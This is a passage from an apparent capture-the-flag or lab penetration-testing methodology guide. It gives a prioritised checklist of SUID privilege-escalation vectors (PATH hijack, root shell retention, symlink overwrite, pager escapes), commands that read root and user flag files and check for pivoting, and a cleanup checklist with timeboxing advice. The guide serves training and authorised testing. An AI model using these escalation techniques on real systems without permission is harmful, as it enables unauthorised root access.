readelf -d /path/binary | grep -E 'BIND_NOW|FLAGS'   # is RELRO full? (memory bugs are then out)

What you are looking for, in priority order:

  1. system() / popen() with a bare command name → PATH hijack (CWE-426)
  2. setuid(0)/seteuid(0) before that call → the shell will not drop privileges → full root
  3. A writable path used by root → symlink or overwrite attack
  4. A shell escape in a pager/editor it invokes

If the binary is setuid and setgid, or lives in a user-writable directory, the box author is telling you this is the path.

Phase 7 — Post-exploitation and reporting

command
cat /root/proof.txt; cat /home/*/local.txt
ip a; ip r          # can this host pivot? (single NIC + default route = no)

Record: exact flags, the id output as root, the mechanism in one paragraph, and every command with its output. Then clean up.

Cleanup checklist

  • Remove every file you created, then verify with ls.
  • Revert any file you modified.
  • Do not change credentials you do not own; if an exploit would have (this box's chpasswd), note that it did not run.
  • Note in the report what you changed and what you left alone.

Timeboxing heuristics

Situation Budget Move on when
Web on a stock default page 10 min Two wordlists + vhosts agree there is nothing
Version-CVE rabbit hole 5 min The package revision shows the backport
Credential guessing 5 min per service Account-specific defaults exhausted
Generic privesc sweep 15 min A custom SUID/service/cron finding exists

The recurring lesson: spend the time on the surface you have not looked at, not on the one you have already disproved. On this box, thirty UDP ports were worth more than an hour of web.
